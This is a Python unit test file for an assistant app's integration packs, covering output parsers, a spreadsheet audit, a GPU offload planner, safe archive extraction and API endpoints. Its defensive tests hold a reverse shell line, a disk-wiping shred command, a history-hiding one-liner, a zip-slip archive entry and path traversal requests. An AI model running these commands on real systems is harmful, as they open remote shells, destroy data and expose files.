"""v1.2 integration packs: workspace inference, the parsers each pack depends on (awesome lists, ruff, pyright, JUnit,
Biome, tsc, cargo, go test, flutter analyze/test, open-code-review, e2e findings, RAD Debugger IPC framing and state),
the spreadsheet audit, the big-model planner, safe archive extraction, pack installs and the integration endpoints.
No network and no toolchains needed. Run from source/:
    python -m unittest discover -s tests -v
"""
import json
import os
import struct
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

if "aero.config" not in sys.modules:
    os.environ["AERO_HOME"] = tempfile.mkdtemp(prefix="aero-test-")
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from aero import bigmodel, config, integrations, pipeline, skills, tools  # noqa: E402
from aero.integrations import (code, debug, diagrams, finance, library, mobile, review, testing,  # noqa: E402
                               toolchain)

tools.load_all()


class Inference(unittest.TestCase):
    CASES = [("I want to build a mobile app for my bakery", "mobile", "flutter"),
             ("Make an architecture diagram of our checkout service", "diagrams", "diagram-design"),
             ("review my changes before I push", "review", "open-code-review"),
             ("build a DCF model for a software company", "finance", "financial-services"),
             ("which python library should I use for async http requests", "library", "awesome-python"),
             ("run a 70B model on my 16GB GPU", "models", "bigmodels"),
             ("generate an image of a cat astronaut", "create", "image"),
             ("explore my website and find bugs in the signup flow", "review", "e2e"),
             ("set up a self-hosted IRC server for my team", "library", "awesome-selfhosted"),
             ("reverse engineer this electron app", "debug", "rea"),
             ("fix the failing tests in my rust project", "code", "essentials"),
             ("debug the crash in my game exe", "debug", "raddebugger")]

    def test_requests_open_the_right_workspace(self):
        available = [c[0] for c in pipeline.tool_catalog(config.load_settings())]
        for text, ws, pack in self.CASES:
            with self.subTest(text=text):
                line, add, got_ws, packs = integrations.context(text, available)
                self.assertEqual(got_ws, ws)
                self.assertIn(pack, packs)
                self.assertIn("Integrations for this request", line)

    def test_plain_chat_opens_nothing(self):
        for text in ("hi", "what's 17 times 23?", "explain how a CPU cache works", "translate good morning"):
            self.assertEqual(integrations.context(text, [])[2], None, text)

    def test_router_catalog_leaves_integration_tools_out(self):
        s = config.load_settings()
        full = {c[0] for c in pipeline.tool_catalog(s)}
        routed = {c[0] for c in pipeline.tool_catalog(s, router=True)}
        self.assertIn("library_search", full)
        self.assertNotIn("library_search", routed)
        self.assertIn("read_file", routed)

    def test_every_pack_tool_is_registered_and_typed(self):
        for p in integrations.PACKS.values():
            for t in p.tools:
                with self.subTest(pack=p.id, tool=t):
                    self.assertIn(t, tools.REGISTRY)
        for name in ("library_search", "diagram_save", "project_check", "code_review", "e2e_explore",
                     "flutter_preview", "image_generate", "bigmodel_plan", "integration_install"):
            self.assertIn(name, tools.REGISTRY)

    def test_pack_skills_load_but_stay_out_of_the_router(self):
        cat = skills.catalog(force=True)
        packs = {s["name"] for s in cat if s["source"] == "pack"}
        for name in ("diagram-design", "open-code-review", "e2e", "reverse-engineer-anything", "dcf-model"):
            self.assertIn(name, packs)
        sk = skills.load("dcf-model")
        self.assertIsNotNone(sk[0])
        self.assertTrue(finance.skill_hint("build an LBO model and a DCF"))

    def test_vendored_packs_keep_their_licences(self):
        root = Path(skills.__file__).parent / "skills_builtin" / "packs"
        for d in root.iterdir():
            with self.subTest(pack=d.name):
                self.assertTrue((d / "UPSTREAM.md").exists())
                self.assertTrue(list(d.glob("LICENSE*")))


class LibraryParsers(unittest.TestCase):
    PY = """# Awesome Python
## Projects
### Web Frameworks
_Libraries for web._
- Synchronous
  - [Django](https://github.com/django/django) - The web framework for perfectionists with deadlines.
- [FastAPI](https://github.com/fastapi/fastapi) - A modern, high-performance web framework.
### HTTP Clients
- [httpx](https://github.com/encode/httpx) - A next generation HTTP client for Python.
## Resources
- [Not a project](https://example.com) - x
"""
    BOSK = """#### CLI Tools &nbsp;[<sup>[TOC]</sup>](#x)
##### :black_small_square: Shells
<p>
&nbsp;&nbsp; <a href="https://www.gnu.org/software/bash/"><b>GNU Bash</b></a> - is an sh-compatible shell.<br>
</p>
#### Shell One-liners &nbsp;[<sup>[TOC]</sup>](#x)
##### Tool: [terminal](https://example.com)
###### Exit without saving shell history
```bash
unset HISTFILE && exit
```
###### Reload shell
```bash
exec $SHELL -l
```
"""

    def test_awesome_python(self):
        its = library.parse_awesome_python(self.PY)
        self.assertEqual([i["name"] for i in its], ["Django", "FastAPI", "httpx"])
        self.assertEqual(its[0]["group"], "Synchronous")
        self.assertEqual(its[2]["category"], "HTTP Clients")

    def test_book_of_secret_knowledge(self):
        links, liners = library.parse_bosk(self.BOSK)
        self.assertEqual(links[0]["name"], "GNU Bash")
        self.assertEqual(links[0]["section"], "Shells")
        self.assertEqual(len(liners), 2)
        self.assertEqual(liners[0]["risks"], ["hides tracks"])
        self.assertEqual(liners[1]["risks"], [])
        self.assertIn("destructive", library.risks_of("shred -n 3 /dev/sda"))
        self.assertIn("remote shell", library.risks_of("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"))

    def test_selfhosted_yaml(self):
        d = library.parse_selfhosted_yaml("name: Ergo\nwebsite_url: https://ergo.chat/\ndescription: IRC server.\n"
                                          "licenses:\n  - MIT\ntags:\n  - Communication - IRC\nstargazers_count: 3348\n"
                                          "archived: false\ncurrent_release:\n  tag: v2.19.1\n")
        self.assertEqual(d["licenses"], ["MIT"])
        self.assertEqual(d["tags"], ["Communication - IRC"])
        self.assertEqual(d["stargazers_count"], 3348)
        self.assertIs(d["archived"], False)

    def test_bundled_snapshots_search(self):
        library._cache.clear()
        names = [x["name"] for x in library.search("async http client", "awesome-python", limit=5)]
        self.assertTrue({"httpx", "aiohttp"} & set(names), names)
        res = library.search("find files larger", "secret-knowledge", limit=5)
        self.assertTrue(any(r.get("code") for r in res))


class CodeParsers(unittest.TestCase):
    def test_ruff_pyright_junit(self):
        root = Path(tempfile.mkdtemp())
        r = code.parse_ruff(json.dumps([{"filename": str(root / "a.py"), "location": {"row": 3, "column": 1},
                                         "code": "F401", "message": "`os` imported but unused"}]), root)
        self.assertEqual((r[0]["file"], r[0]["line"], r[0]["code"]), ("a.py", 3, "F401"))
        p = code.parse_pyright(json.dumps({"generalDiagnostics": [{"file": str(root / "b.py"), "severity": "error",
                                                                    "message": "x", "rule": "reportX",
                                                                    "range": {"start": {"line": 4, "character": 2}}}]}),
                               root)
        self.assertEqual((p[0]["line"], p[0]["col"]), (5, 3))
        xml = root / "j.xml"
        xml.write_text('<testsuite><testcase classname="t" name="ok"/><testcase classname="t" name="bad" file="t.py" '
                       'line="9"><failure message="assert 1 == 2"/></testcase></testsuite>', encoding="utf-8")
        j = code.parse_junit(xml, root)
        self.assertEqual(len(j), 1)
        self.assertIn("assert 1 == 2", j[0]["message"])

    def test_biome_tsc_cargo_go(self):
        root = Path(".")
        b = code.parse_biome('{"diagnostics":[{"category":"lint/style","severity":"error","description":"no var",'
                             '"location":{"path":{"file":"src/a.ts"},"start":{"line":2,"column":1}}}]}', root)
        self.assertEqual(b[0]["code"], "lint/style")
        t = code.parse_tsc("src/a.ts(12,5): error TS2322: Type 'string' is not assignable to type 'number'.", root)
        self.assertEqual((t[0]["line"], t[0]["code"]), (12, "TS2322"))
        c = code.parse_cargo(json.dumps({"reason": "compiler-message", "message": {
            "level": "warning", "message": "unused variable", "code": {"code": "unused_variables"},
            "spans": [{"is_primary": True, "file_name": "src/main.rs", "line_start": 4, "column_start": 9}]}}), root)
        self.assertEqual((c[0]["line"], c[0]["code"]), (4, "unused_variables"))
        g = code.parse_go_test("\n".join(json.dumps(x) for x in (
            {"Action": "output", "Package": "p", "Test": "TestA", "Output": "want 2 got 3\n"},
            {"Action": "fail", "Package": "p", "Test": "TestA"})), root)
        self.assertIn("want 2 got 3", g[0]["message"])

    def test_detect(self):
        d = Path(tempfile.mkdtemp())
        (d / "package.json").write_text(json.dumps({"devDependencies": {"typescript": "7", "vite": "8"},
                                                    "scripts": {"test": "vitest", "build": "vite build"}}), encoding="utf-8")
        (d / "Cargo.toml").write_text("[package]\nname='x'\n", encoding="utf-8")
        info = code.detect(d)
        self.assertIn("typescript", info["kinds"])
        self.assertIn("rust", info["kinds"])
        self.assertEqual(info["commands"]["test"], "npm run test")


class OtherParsers(unittest.TestCase):
    def test_flutter_machine_outputs(self):
        a = mobile.parse_analyze("ERROR|COMPILE_TIME_ERROR|UNDEFINED_IDENTIFIER|C:/app/lib/main.dart|12|7|3|Undefined name 'x'.",
                                 "C:/app")
        self.assertEqual((a[0]["line"], a[0]["severity"], a[0]["code"]), (12, "error", "undefined_identifier"))
        events = [{"type": "testStart", "test": {"id": 1, "name": "adds"}}, {"type": "testDone", "testID": 1,
                                                                              "result": "success", "hidden": False},
                  {"type": "testStart", "test": {"id": 2, "name": "subtracts"}},
                  {"type": "error", "testID": 2, "error": "Expected: 1 Actual: 2"},
                  {"type": "testDone", "testID": 2, "result": "failure", "hidden": False}]
        passed, failed, fails = mobile.parse_test("\n".join(json.dumps(e) for e in events))
        self.assertEqual((passed, failed), (1, 1))
        self.assertIn("Expected: 1", fails[0]["error"])

    def test_open_code_review_summary_and_rules(self):
        res = {"status": "success", "summary": {"files_reviewed": 2, "elapsed": "1m"}, "comments": [
            {"path": "a.go", "start_line": 42, "severity": "high", "category": "bug", "content": "Concurrent map write.",
             "suggestion_code": "mu.Lock()"},
            {"path": "b.go", "start_line": 3, "severity": "low", "category": "style", "content": "Naming."}]}
        s = review.summarize(res)
        self.assertLess(s.index("[high]"), s.index("[low]"))
        self.assertIn("suggestion: mu.Lock()", s)
        ctx = tools.Ctx(config.load_settings())
        out = review.code_review_rules(ctx, ["main.py", "src/app.ts"])
        self.assertIn("Rules: python", out)
        self.assertIn("Rules: ts_js_tsx_jsx", out)

    def test_e2e_findings_walker(self):
        d = Path(tempfile.mkdtemp())
        (d / "report.json").write_text(json.dumps({"steps": [{"findings": [
            {"title": "Signup button does nothing", "severity": 4, "expected": "account created", "actual": "no change"}]}]}),
            encoding="utf-8")
        f = testing._findings(d)
        self.assertEqual(f[0]["severity"], 4)

    def test_raddbg_ipc_framing_and_state(self):
        pkt = debug.frame("state")
        self.assertEqual(struct.unpack_from("<IQ", pkt, 0), (debug.MAGIC, 5))
        reply = struct.pack("<IQ", debug.MAGIC, 11) + b"one\0two\0end"
        self.assertEqual(debug.unframe(reply), ["one", "two", "end"])
        st = debug.parse_state("running: 0\nip: 0x7ff6a\nsymbol: main\nstop_event: {kind: exception code: 0xc0000005}")
        self.assertEqual((st["running"], st["symbol"]), ("0", "main"))
        self.assertIn("0xc0000005", st["stop_event"])
        self.assertFalse(debug.SAFE_CMDS.match("launch_and_run C:/evil.exe"))
        self.assertTrue(debug.SAFE_CMDS.match("step_over"))

    def test_xlsx_audit(self):
        import openpyxl
        p = Path(tempfile.mkdtemp()) / "m.xlsx"
        wb = openpyxl.Workbook()
        ws = wb.active
        ws["A1"], ws["B1"], ws["C1"], ws["D1"], ws["E1"] = 1, 2, 3, 4, 5
        ws["A2"], ws["B2"], ws["C2"], ws["D2"] = "=A1*2", "=B1*2", "=C1*2", "=D1*2"
        ws["E2"] = "=E1*1.0725"                       # hard-coded and breaks the row
        ws["A3"] = "=Z99"                             # empty cell
        ws["B3"], ws["C3"] = "=C3+1", "=B3+1"        # circular
        wb.save(p)
        issues, no_cache = finance.audit(p)
        text = " | ".join(f"{c}: {m}" for _k, _s, c, m in issues)
        self.assertIn("hard-coded number", text)
        self.assertIn("differs from the rest of its row", text)
        self.assertIn("empty cell", text)
        self.assertIn("circular reference", text)
        self.assertGreater(no_cache, 0)


class BigModelPlanner(unittest.TestCase):
    def _info(self, n=40, attn=100, ffn=400, exps=0, out=500, embd=500):
        mb = 2**20
        return {"meta": {"n_layer": n, "n_embd": 4096, "n_head": 32, "n_head_kv": 8, "ctx_train": 32768,
                         "head_count_kv": 8, "embedding_length": 4096, "block_count": n},
                "layers": [{"attn": attn * mb, "ffn": ffn * mb, "exps": exps * mb, "other": 0} for _ in range(n)],
                "other": {"token_embd": embd * mb, "output": out * mb, "rest": 0},
                "total": (n * (attn + ffn + exps) + out + embd) * mb, "moe": bool(exps)}

    def test_dense_model_gets_layer_and_ffn_plans(self):
        with mock.patch.object(bigmodel.gguf, "kv_mb", lambda meta, ctx, kv="q8_0": 1600.0):
            plans = bigmodel.plan(self._info(), 12000, 64000, 8192)
        by = {p["strategy"]: p for p in plans}
        self.assertIn("layers", by)
        self.assertIn("ffn", by)
        for p in plans:
            self.assertLessEqual(p["gpu_mb"], 12000)
        self.assertEqual(by["ffn"]["cfg"]["ngl"], 999)
        self.assertTrue(by["ffn"]["cfg"]["ot"][0].endswith("=CPU"))
        self.assertGreater(by["ffn"]["kv_gpu_mb"], by["layers"]["kv_gpu_mb"])     # attention + KV all on the GPU

    def test_moe_model_moves_experts(self):
        with mock.patch.object(bigmodel.gguf, "kv_mb", lambda meta, ctx, kv="q8_0": 800.0):
            plans = bigmodel.plan(self._info(n=48, attn=60, ffn=0, exps=1200), 16000, 90000, 8192)
        moe = next(p for p in plans if p["strategy"] == "moe")
        self.assertGreater(moe["cfg"]["ncmoe"], 0)
        self.assertLessEqual(moe["gpu_mb"], 16000)

    def test_fits_on_gpu_and_ram_warning(self):
        with mock.patch.object(bigmodel.gguf, "kv_mb", lambda meta, ctx, kv="q8_0": 100.0):
            self.assertEqual(bigmodel.plan(self._info(n=4), 16000, 64000)[0]["strategy"], "gpu")
            plans = bigmodel.plan(self._info(n=200), 8000, 4000)
        self.assertFalse(plans[0]["fits_ram"])
        self.assertIn("streams from disk", plans[0]["note"])

    def test_override_is_passed_to_llama_server(self):
        from aero import engine
        with mock.patch.object(engine, "server_help", lambda: ""), mock.patch.object(engine, "supports", lambda f: False):
            a = engine.build_args("m.gguf", {"ctx": 4096, "ngl": 999, "ot": [bigmodel.ffn_override(range(3))]}, 8181)
        i = a.index("-ot")
        self.assertEqual(a[i + 1], "blk\\.(0|1|2)\\.ffn_(up|down|gate)\\.weight=CPU")


class Toolchain(unittest.TestCase):
    def test_extract_refuses_paths_outside(self):
        d = Path(tempfile.mkdtemp())
        z = d / "bad.zip"
        with zipfile.ZipFile(z, "w") as f:
            f.writestr("ok/file.txt", "fine")
            f.writestr("../escape.txt", "nope")
        with self.assertRaises(RuntimeError):
            toolchain.extract(z, d / "out")
        self.assertFalse((d / "escape.txt").exists())

    def test_strip_and_env(self):
        d = Path(tempfile.mkdtemp())
        z = d / "sdk.zip"
        with zipfile.ZipFile(z, "w") as f:
            f.writestr("flutter/bin/flutter", "#!")
        toolchain.extract(z, d / "o", strip=1)
        self.assertTrue((d / "o" / "bin" / "flutter").exists())
        e = toolchain.env()
        self.assertEqual(e["E2E_TELEMETRY_DISABLED"], "1")
        self.assertEqual(e["DO_NOT_TRACK"], "1")

    def test_strict_offline_refuses_network_programs(self):
        with mock.patch("aero.localonly.strict", lambda: True):
            with self.assertRaises(toolchain.Offline):
                toolchain.run(["npm", "install", "x"], network=True)
            with self.assertRaises(toolchain.Offline):
                toolchain.download("https://example.com/x", tempfile.mktemp())

    def test_install_reports_what_needs_the_user(self):
        done = integrations.install("xtool", "apple")
        self.assertIn("needs the user", done[0][1])


class Endpoints(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from fastapi.testclient import TestClient
        from aero import server
        cls.c = TestClient(server.app)

    def test_overview_and_panels(self):
        ws = self.c.get("/api/integrations").json()["workspaces"]
        self.assertEqual([w["id"] for w in ws][:3], ["code", "mobile", "create"])
        self.assertTrue(all(w["packs"] for w in ws))
        d = self.c.get("/api/integrations/ws/library").json()
        self.assertTrue(any(p["id"] == "awesome-python" for p in d["packs"]))
        self.assertEqual(self.c.get("/api/integrations/ws/nope").status_code, 404)

    def test_library_search_endpoint(self):
        r = self.c.get("/api/library/search", params={"q": "web framework", "source": "awesome-python"}).json()
        self.assertTrue(r["results"])

    def test_run_endpoint_only_runs_integration_tools(self):
        self.assertEqual(self.c.post("/api/integrations/run", json={"tool": "run_command",
                                                                    "args": {"command": "echo hi"}}).status_code, 400)
        r = self.c.post("/api/integrations/run", json={"tool": "library_search", "args": {"query": "orm"}}).json()
        self.assertFalse(r["error"])

    def test_file_endpoint_stays_in_its_folder(self):
        diagrams.DIR.mkdir(parents=True, exist_ok=True)
        (diagrams.DIR / "x.html").write_text("<svg></svg>", encoding="utf-8")
        r = self.c.get("/api/integrations/file/diagrams/x.html")
        self.assertEqual(r.status_code, 200)
        self.assertIn("sandbox", r.headers.get("content-security-policy", ""))
        self.assertEqual(self.c.get("/api/integrations/file/diagrams/..%2F..%2Fsettings.json").status_code, 404)
        self.assertEqual(self.c.get("/api/integrations/file/etc/passwd").status_code, 404)


if __name__ == "__main__":
    unittest.main()
